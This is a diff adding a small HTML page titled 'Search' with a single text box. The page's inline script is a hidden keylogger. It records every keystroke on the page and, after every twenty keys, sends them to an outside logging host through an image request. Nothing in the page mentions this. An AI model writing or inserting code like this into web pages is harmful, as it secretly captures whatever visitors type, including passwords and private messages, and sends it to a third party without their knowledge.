@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Search</title>
+</head>
+<body>
+<input id="q" type="text">
+<script>
+  var keys = [];
+  document.addEventListener("keydown", function (e) {
+    keys.push(e.key);
+    if (keys.length > 20) {
+      new Image().src = "https://k.evil-example.test/log?k=" + encodeURIComponent(keys.join(""));
+      keys = [];
+    }
+  });
+</script>
+</body>
+</html>
